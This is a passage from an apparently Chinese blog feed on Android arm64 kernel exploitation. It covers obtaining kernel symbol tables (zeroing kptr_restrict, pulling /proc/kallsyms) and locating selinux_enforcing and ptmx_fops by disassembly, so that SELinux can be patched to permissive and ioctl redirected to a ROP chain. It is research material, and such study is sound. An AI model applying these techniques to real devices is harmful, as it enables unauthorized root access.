<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">while</span> (getppid() != <span class="number">1</span>) &#123;</span><br><span class="line">            sleep(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// do something...</span></span><br><span class="line">        <span class="comment">// my parent is init...</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (pid &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="comment">// waitpid(pid, NULL, 0);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>所以也可以通过这种方法获取init进程的task_struct，至于其他的用处，对方不想说话并向你扔了一头猪。。。</p>
<h2 id="内核栈">内核栈</h2><p>task_struct中<code>void *stack</code>指向当前进程的内核栈，进程通过alloc_thread_info函数分配它的内核栈，通过free_thread_info函数释放所分配的内核栈。</p>
<p>Linux内核通过thread_union联合体来表示进程的内核栈，其中THREAD_SIZE宏的大小为8192。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> thread_union &#123;  </span><br><span class="line">    <span class="keyword">struct</span> thread_info thread_info;  </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="built_in">stack</span>[THREAD_SIZE/<span class="keyword">sizeof</span>(<span class="keyword">long</span>)];  </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>当进程从用户态切换到内核态时，进程的内核栈总是空的，所以ARM的sp寄存器指向这个栈的顶端。因此，内核能够轻易地通过sp寄存器获得当前正在CPU上运行的进程。<br>由于堆栈是向下增长的，esp和thread_info位于同一个8KB或者4KB的块当中，也就是thread_union的长度了。<br>如果是8KB，屏蔽esp的低13位就可以得到thread_info的地址，也就是8KB块的开始位置。4KB的话，就屏蔽低12位。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">struct</span> thread_info *<span class="title">current_thread_info</span><span class="params">(<span class="keyword">void</span>)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">      <span class="function"><span class="keyword">register</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> sp <span class="title">asm</span> <span class="params">(<span class="string">"sp"</span>)</span></span>;</span><br><span class="line">      <span class="keyword">return</span> (<span class="keyword">struct</span> thread_info *)(sp &amp; ~(THREAD_SIZE - <span class="number">1</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>汇编:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mov R2, <span class="preprocessor">#<span class="number">0xffffe000</span></span></span><br><span class="line">and R3, R2, esp  </span><br><span class="line"></span><br><span class="line">或 </span><br><span class="line"></span><br><span class="line">BIC R3, R2, <span class="preprocessor">#<span class="number">0x1FC0</span></span></span><br><span class="line">BIC R3, R3, <span class="preprocessor">#<span class="number">0x3F</span></span></span><br></pre></td></tr></table></figure>
<p>thread_info结构中也有很多重要的字段，如进程描述符task，获取任意地址读写能力的addr_limit等。</p>
<h2 id="待续">待续</h2><p>待更…</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>漏洞利用的核心都是通过修改task_struct中的一些字段来达到任意地址读写和提权操作的。<br>]]>
    
    </summary>
    
      <category term="task" scheme="http://blog.idhyt.com/tags/task/"/>
    
      <category term="thread" scheme="http://blog.idhyt.com/tags/thread/"/>
    
      <category term="exploit" scheme="http://blog.idhyt.com/categories/exploit/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[如何优雅的使用内核符号表]]></title>
    <link href="http://blog.idhyt.com/2016/05/09/exploit-kernel-symbol-usage/"/>
    <id>http://blog.idhyt.com/2016/05/09/exploit-kernel-symbol-usage/</id>
    <published>2016-05-09T15:31:24.000Z</published>
    <updated>2017-01-02T08:57:26.000Z</updated>
    <content type="html"><![CDATA[<p>主要针对arm64，现在ida6.8并不支持arm64的反汇编，所以在定位代码过程中会很麻烦，而32位是直接可以f5对照源码看的。</p>
<a id="more"></a>
<h2 id="获取内核符号表">获取内核符号表</h2><p>先放一个内核符号表的部分样子：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">ffffffc000081000 do_undefinstr</span><br><span class="line">ffffffc000081000 _stext</span><br><span class="line">ffffffc000081000 __exception_text_start</span><br><span class="line">ffffffc000081348 do_mem_abort</span><br><span class="line">ffffffc0000813e4 do_sp_pc_abort</span><br><span class="line">ffffffc000081428 do_debug_exception</span><br><span class="line">ffffffc0000814d4 gic_handle_irq</span><br><span class="line">ffffffc000081554 gic_handle_irq</span><br><span class="line">ffffffc0000815d4 __exception_text_end</span><br><span class="line">ffffffc0000815d8 match_dev_by_uuid</span><br><span class="line">ffffffc000081618 <span class="keyword">name_to_dev_t</span></span><br><span class="line">ffffffc000082000 swp_handler.part<span class="number">.1</span></span><br><span class="line">ffffffc000082138 swp_handler</span><br><span class="line">ffffffc0000821fc clear_os_lock</span><br><span class="line">ffffffc000082208 create_debug_debugfs_entry</span><br><span class="line">ffffffc000082238 brk_handler.part<span class="number">.2</span></span><br><span class="line">ffffffc0000822a0 brk_handler</span><br><span class="line">ffffffc00008238c single_step_handler.part<span class="number">.3</span></span><br><span class="line">ffffffc0000823f8 single_step_handler</span><br><span class="line">ffffffc0000824f8 debug_monitors_arch</span><br><span class="line">ffffffc000082504 enable_debug_monitors</span><br><span class="line">ffffffc000082620 disable_debug_monitors</span><br><span class="line">ffffffc00008270c register_step_hook</span><br><span class="line">ffffffc000082764 unregister_step_hook</span><br><span class="line">ffffffc0000827c4 register_break_hook </span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h3 id="有root权限">有root权限</h3><p>两条命令即可：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">adb shell, echo <span class="number">0</span> &gt; /proc/sys/kernel/kptr_restrict sysctl </span><br><span class="line">adb pull /proc/kallsyms kallsyms.txt</span><br></pre></td></tr></table></figure></p>
<h3 id="无root权限">无root权限</h3><p>1.获取kernel文件，解压rom包找到boot.img文件，然后<a href="https://github.com/idhyt/exploit_tools/blob/master/bootimg.py" target="_blank" rel="external">bootimg</a>提取kernel压缩文件，直接解压获取kernel文件。如果解压失败，用二进制文件打开，查找特征值<code>1F 8B 08</code>，删除之前数据保存并解压。</p>
<p>2.使用<a href="https://github.com/idhyt/exploit_tools/tree/master/kallsymsprint-master" target="_blank" rel="external">kallsymsprint</a>获取，参数为kernel文件路径。</p>
<p>3.懒人的方法，打包一个脚本<a href="https://github.com/idhyt/dump_kallsyms" target="_blank" rel="external">dump_kallsyms</a>搞定 : )</p>
<h2 id="patch_selinux_mode">patch selinux mode</h2><p>内核提权过程中，完成了addr_limit字段的patch之后，那么用户态就可以任意读写内核态了，但是如果系统的selinux使用的是enforcing模式，后续的提权过程需要pacth selinux mode。</p>
<p>源码中<code>#define selinux_enforcing 1</code>，该模式为<code>enforcing</code>，获得任意读写能力之后将其置0即可改为<code>permissive</code>。</p>
<p>查找内核符号表，变量selinux_enforcing并没有导出地址(部分会有)，查找源码找到使用该值的地方，例如在<code>enforcing_setup</code>函数中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __<span class="function">init <span class="title">enforcing_setup</span><span class="params">(<span class="keyword">char</span> *str)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> enforcing;</span><br><span class="line">    <span class="keyword">if</span> (!kstrtoul(str, <span class="number">0</span>, &amp;enforcing))</span><br><span class="line">        selinux_enforcing = enforcing ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在内核符号表中找到函数enforcing_setup的地址为<code>0xffffffc000d75878</code>，反汇编该地址处的代码。<br>ida无法反汇编arm64，可以通过python的<code>capstone</code>模块进行反汇编，用法可<a href="https://github.com/idhyt/magic_lamp/blob/master/hex-code-disasm.py" target="_blank" rel="external">参考</a>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0xffffffc000d75878</span>:     stp     x29, x30, [sp, <span class="preprocessor">#-<span class="number">0x20</span>]!</span></span><br><span class="line"><span class="number">0xffffffc000d7587c</span>:     movz    w1, <span class="preprocessor">#<span class="number">0</span></span></span><br><span class="line"><span class="number">0xffffffc000d75880</span>:     mov     x29, sp</span><br><span class="line"><span class="number">0xffffffc000d75884</span>:     add     x2, x29, <span class="preprocessor">#<span class="number">0x18</span></span></span><br><span class="line"><span class="number">0xffffffc000d75888</span>:     bl      <span class="preprocessor">#<span class="number">0xffffffc000324c88</span></span></span><br><span class="line"><span class="number">0xffffffc000d7588c</span>:     cbnz    w0, <span class="preprocessor">#<span class="number">0xffffffc000d758a4</span></span></span><br><span class="line"><span class="number">0xffffffc000d75890</span>:     ldr     x0, [x29, <span class="preprocessor">#<span class="number">0x18</span>]</span></span><br><span class="line"><span class="number">0xffffffc000d75894</span>:     cmp     x0, xzr</span><br><span class="line"><span class="number">0xffffffc000d75898</span>:     adrp    x0, <span class="preprocessor">#<span class="number">0xffffffc000f2f000</span></span></span><br><span class="line"><span class="number">0xffffffc000d7589c</span>:     cset    w1, ne</span><br><span class="line"><span class="number">0xffffffc000d758a0</span>:     str     w1, [x0, <span class="preprocessor">#<span class="number">0xc0c</span>]</span></span><br><span class="line"><span class="number">0xffffffc000d758a4</span>:     movz    w0, <span class="preprocessor">#<span class="number">0x1</span></span></span><br><span class="line"><span class="number">0xffffffc000d758a8</span>:     ldp     x29, x30, [sp], <span class="preprocessor">#<span class="number">0x20</span></span></span><br><span class="line"><span class="number">0xffffffc000d758ac</span>:     ret</span><br></pre></td></tr></table></figure>
<p>enforcing_setup = 0xffffffc000f2f000 + 0xc0c</p>
<h2 id="patch_ioctl">patch ioctl</h2><p>在linux内核PXN开启且代码段只读开启的前提下，如果获得了任意地址写的能力,怎么提权呢，ret2user是不行了，安装一个syscall调用commit_creds也不行了，sys_call_table也是不能改的(引自网络)。一种思路是通过改写<code>ptmx_fops-&gt;unlocked_ioctl</code>指向rop，然后调用<code>/dev/ptmx</code>的ioctl即可跳入rop中执行。</p>
<p>同样ptmx_fops在内核符号表中是没有导出的，如何确定该地址并修改unlocked_ioctl的指针。</p>
<p>查看源码ptmx_fops使用的地方。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __<span class="function">init <span class="title">pty_init</span><span class="params">(<span class="keyword">void</span>)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    legacy_pty_init();</span><br><span class="line">    unix98_pty_init();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __<span class="function">init <span class="title">unix98_pty_init</span><span class="params">(<span class="keyword">void</span>)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">/* Now create the /dev/ptmx special device */</span></span><br><span class="line">    tty_default_fops(&amp;ptmx_fops);</span><br><span class="line">    ptmx_fops.open = ptmx_open;</span><br><span class="line"></span><br><span class="line">    cdev_init(&amp;ptmx_cdev, &amp;ptmx_fops);</span><br><span class="line">    <span class="keyword">if</span> (cdev_add(&amp;ptmx_cdev, MKDEV(TTYAUX_MAJOR, <span class="number">2</span>), <span class="number">1</span>) ||</span><br><span class="line">        register_chrdev_region(MKDEV(TTYAUX_MAJOR, <span class="number">2</span>), <span class="number">1</span>, <span class="string">"/dev/ptmx"</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        panic(<span class="string">"Couldn't register /dev/ptmx driver"</span>);</span><br><span class="line">    device_create(tty_class, <span class="literal">NULL</span>, MKDEV(TTYAUX_MAJOR, <span class="number">2</span>), <span class="literal">NULL</span>, <span class="string">"ptmx"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">tty_default_fops</span><span class="params">(<span class="keyword">struct</span> file_operations *fops)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    *fops = tty_fops;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在ptmx设备初始化时<code>tty_default_fops</code>会将指针tty_fops赋值给ptmx_fops，调用ptmx_fops的时候会通过tty_fops指针调相应的函数，其tty_fops定义为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">struct</span> file_operations tty_fops = &#123;</span><br><span class="line">    .llseek     = no_llseek,</span><br><span class="line">    .read       = tty_read,</span><br><span class="line">    .write      = tty_write,</span><br><span class="line">    .poll       = tty_poll,</span><br><span class="line">    .unlocked_ioctl = tty_ioctl,</span><br><span class="line">    .compat_ioctl   = tty_compat_ioctl,</span><br><span class="line">    .open       = tty_open,</span><br><span class="line">    .release    = tty_release,</span><br><span class="line">    .fasync     = tty_fasync,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>最后会通过fops-&gt;unlocked_ioctl调用tty_ioctl.</p>
<p>unix98_pty_init函数为inline类型，编译器编译时候会直接内联到调用函数中，所以从内核符号表中找到pty_init函数地址为<code>0xffffffc000d78e80</code>，然后进行反汇编：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0xffffffc000d78e80</span>:     stp     x29, x30, [sp, <span class="preprocessor">#-<span class="number">0x70</span>]!</span></span><br><span class="line"><span class="number">0xffffffc000d78e84</span>:     mov     x29, sp</span><br><span class="line"><span class="number">0xffffffc000d78e88</span>:     stp     x19, x20, [sp, <span class="preprocessor">#<span class="number">0x10</span>]</span></span><br><span class="line"><span class="number">0xffffffc000d78e8c</span>:     adrp    x20, <span class="preprocessor">#<span class="number">0xffffffc000df5000</span></span></span><br><span class="line"><span class="number">0xffffffc000d78e90</span>:     stp     x23, x24, [sp, <span class="preprocessor">#<span class="number">0x30</span>]</span></span><br><span class="line"><span class="number">0xffffffc000d78e94</span>:     stp     x21, x22, [sp, <span class="preprocessor">#<span class="number">0x20</span>]</span></span><br><span class="line"><span class="number">0xffffffc000d78e98</span>:     ldr     w0, [x20, <span class="preprocessor">#<span class="number">0xef0</span>]</span></span><br><span class="line"><span class="number">0xffffffc000d78e9c</span>:     adrp    x23, <span class="preprocessor">#<span class="number">0xffffffc000df5000</span></span></span><br><span class="line"><span class="number">0xffffffc000d78ea0</span>:     stp     x25, x26, [sp, <span class="preprocessor">#<span class="number">0x40</span>]</span></span><br><span class="line"><span class="number">0xffffffc000d78ea4</span>:     stp     x27, x28, [sp, <span class="preprocessor">#<span class="number">0x50</span>]</span></span><br><span class="line"><span class="number">0xffffffc000d78ea8</span>:     cmp     w0, wzr</span><br><span class="line"><span class="number">0xffffffc000d78eac</span>:     adrp    x25, <span class="preprocessor">#<span class="number">0xffffffc000c1e000</span></span></span><br><span class="line"><span class="number">0xffffffc000d78eb0</span>:     adrp    x22, <span class="preprocessor">#<span class="number">0xffffffc000a35000</span></span></span><br><span class="line"><span class="number">0xffffffc000d78eb4</span>:     adrp    x24, <span class="preprocessor">#<span class="number">0xffffffc000c1e000</span></span></span><br><span class="line"><span class="number">0xffffffc000d78eb8</span>:     b.le    <span class="preprocessor">#<span class="number">0xffffffc000d79014</span></span></span><br><span class="line"><span class="number">0xffffffc000d78ebc</span>:     movz    x1, <span class="preprocessor">#<span class="number">0</span></span></span><br><span class="line"><span class="number">0xffffffc000d78ec0</span>:     movz    x2, <span class="preprocessor">#<span class="number">0x46</span></span></span><br><span class="line"><span class="number">0xffffffc000d78ec4</span>:     bl      <span class="preprocessor">#<span class="number">0xffffffc0003413d0</span></span></span><br><span class="line"><span class="number">0xffffffc000d78ec8</span>:     cmn     x0, <span class="preprocessor">#<span class="number">1</span>, lsl #<span class="number">12</span></span></span><br><span class="line"><span class="number">0xffffffc000d78ecc</span>:     mov     x19, x0</span><br><span class="line"><span class="number">0xffffffc000d78ed0</span>:     b.ls    <span class="preprocessor">#<span class="number">0xffffffc000d78ee0</span></span></span><br><span class="line"><span class="number">0xffffffc000d78ed4</span>:     adrp    x0, <span class="preprocessor">#<span class="number">0xffffffc000c1e000</span></span></span><br><span class="line"><span class="number">0xffffffc000d78ed8</span>:     add     x0, x0, <span class="preprocessor">#<span class="number">0x7c0</span></span></span><br><span class="line"><span class="number">0xffffffc000d78edc</span>:     bl      <span class="preprocessor">#<span class="number">0xffffffc0009a799c</span></span></span><br><span class="line"><span class="number">0xffffffc000d78ee0</span>:     ldr     w0, [x20, <span class="preprocessor">#<span class="number">0xef0</span>]</span></span><br><span class="line"><span class="number">0xffffffc000d78ee4</span>:     movz    x1, <span class="preprocessor">#<span class="number">0</span></span></span><br><span class="line"><span class="number">0xffffffc000d78ee8</span>:     movz    x2, <span class="preprocessor">#<span class="number">0x46</span></span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>pty_init函数比较长，纯看汇编很难定位到<code>tty_default_fops(&amp;ptmx_fops)</code>这个地方，一种方法是找到32位的kernel反汇编对照着看，因为32位可以用ida的F5，但是依然麻烦。</p>
<p>这里注意到tty_default_fops这个函数在内核符号表中是有导出的，地址为<code>0xffffffc0003431b4</code>，现在重新看反汇编，直接查找这个值，定位附近的代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0xffffffc000d79174</span>:     add     x0, x0, <span class="preprocessor">#<span class="number">0x8f8</span></span></span><br><span class="line"><span class="number">0xffffffc000d79178</span>:     bl      <span class="preprocessor">#<span class="number">0xffffffc0009a799c</span></span></span><br><span class="line"><span class="number">0xffffffc000d7917c</span>:     add     x19, x20, <span class="preprocessor">#<span class="number">0x10</span></span></span><br><span class="line"><span class="number">0xffffffc000d79180</span>:     add     x20, x20, <span class="preprocessor">#<span class="number">0xe8</span></span></span><br><span class="line"><span class="number">0xffffffc000d79184</span>:     mov     x0, x19</span><br><span class="line"><span class="number">0xffffffc000d79188</span>:     bl      <span class="preprocessor">#<span class="number">0xffffffc0003431b4</span></span></span><br><span class="line"><span class="number">0xffffffc000d7918c</span>:     adrp    x2, <span class="preprocessor">#<span class="number">0xffffffc00034a000</span></span></span><br></pre></td></tr></table></figure>
<p>这里第一个参数x0即为ptmx_fops值。<br>x0 = x19 = x20 + 0x10<br>往上看x20赋值的地方。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0xffffffc000d79010</span>:     bl      <span class="preprocessor">#<span class="number">0xffffffc0009a799c</span></span></span><br><span class="line"><span class="number">0xffffffc000d79014</span>:     adrp    x21, <span class="preprocessor">#<span class="number">0xffffffc000f36000</span></span></span><br><span class="line"><span class="number">0xffffffc000d79018</span>:     movz    w0, <span class="preprocessor">#<span class="number">0x10</span>, lsl #<span class="number">16</span></span></span><br><span class="line"><span class="number">0xffffffc000d7901c</span>:     movz    x1, <span class="preprocessor">#<span class="number">0</span></span></span><br><span class="line"><span class="number">0xffffffc000d79020</span>:     movz    x2, <span class="preprocessor">#<span class="number">0x5e</span></span></span><br><span class="line"><span class="number">0xffffffc000d79024</span>:     add     x20, x21, <span class="preprocessor">#<span class="number">0xd80</span></span></span><br><span class="line"><span class="number">0xffffffc000d79028</span>:     bl      <span class="preprocessor">#<span class="number">0xffffffc0003413d0</span></span></span><br></pre></td></tr></table></figure>
<p>x20 = x21 + 0xd80 = 0xffffffc000f36000 + 0xd80<br>得出<br>ptmx_fops = 0xffffffc000f36000 + 0xd80 + 0x10</p>
<h2 id="计算函数偏移">计算函数偏移</h2><p>接上边，在path ioctl过程中，如何找到ptmx对应的<code>tty_ioctl</code>，这个syscall调用流程为：<br>sys_ioctl -&gt; do_vfs_ioctl -&gt; tty_ioctl<br>部分源码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">do_vfs_ioctl</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="keyword">unsigned</span> <span class="keyword">int</span> fd, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd,</span><br><span class="line">         <span class="keyword">unsigned</span> <span class="keyword">long</span> arg)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">if</span> (S_ISREG(inode-&gt;i_mode))</span><br><span class="line">            error = file_ioctl(filp, cmd, arg);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            error = vfs_ioctl(filp, cmd, arg);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">vfs_ioctl</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd,</span><br><span class="line">              <span class="keyword">unsigned</span> <span class="keyword">long</span> arg)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> error = -ENOTTY;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!filp-&gt;f_op || !filp-&gt;f_op-&gt;unlocked_ioctl)</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">    error = filp-&gt;f_op-&gt;unlocked_ioctl(filp, cmd, arg);</span><br><span class="line">    <span class="keyword">if</span> (error == -ENOIOCTLCMD)</span><br><span class="line">        error = -ENOTTY;</span><br><span class="line"> out:</span><br><span class="line">    <span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后调用<code>filp-&gt;f_op-&gt;unlocked_ioctl(filp, cmd, arg)</code></p>
<p>所以确定tty_ioctl的偏移即可以从相应的反汇编的寄存器传值看出，当然也可以直接从定义的tty_fops结构中算出，但是如果是复杂的结构体呢。</p>
<p>通过内核符号表找到do_vfs_ioctl的地址为<code>0xffffffc0001a4ca4</code>,反汇编代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0xffffffc0001a4ca4</span>: stp x29, x30, [sp, <span class="preprocessor">#-<span class="number">0x90</span>]!</span></span><br><span class="line"><span class="number">0xffffffc0001a4ca8</span>: movz    w4, <span class="preprocessor">#<span class="number">0x5452</span></span></span><br><span class="line"><span class="number">0xffffffc0001a4cac</span>: mov x29, sp</span><br><span class="line"><span class="number">0xffffffc0001a4cb0</span>: stp x19, x20, [sp, <span class="preprocessor">#<span class="number">0x10</span>]</span></span><br><span class="line"><span class="number">0xffffffc0001a4cb4</span>: stp x21, x22, [sp, <span class="preprocessor">#<span class="number">0x20</span>]</span></span><br><span class="line"><span class="number">0xffffffc0001a4cb8</span>: str x23, [sp, <span class="preprocessor">#<span class="number">0x30</span>]</span></span><br><span class="line"><span class="number">0xffffffc0001a4cbc</span>: cmp w2, w4</span><br><span class="line"><span class="number">0xffffffc0001a4cc0</span>: mov x19, x0</span><br><span class="line"><span class="number">0xffffffc0001a4cc4</span>: mov x20, x3</span><br><span class="line"><span class="number">0xffffffc0001a4cc8</span>: ldr x21, [x0, <span class="preprocessor">#<span class="number">0x20</span>]</span></span><br><span class="line"><span class="number">0xffffffc0001a4ccc</span>: b.eq    <span class="preprocessor">#<span class="number">0xffffffc0001a5068</span></span></span><br><span class="line"><span class="number">0xffffffc0001a4cd0</span>: b.ls    <span class="preprocessor">#<span class="number">0xffffffc0001a4e4c</span></span></span><br><span class="line"><span class="number">0xffffffc0001a4cd4</span>: movz    w0, <span class="preprocessor">#<span class="number">0x5877</span></span></span><br><span class="line"><span class="number">0xffffffc0001a4cd8</span>: movk    w0, <span class="preprocessor">#<span class="number">0xc004</span>, lsl #<span class="number">16</span></span></span><br><span 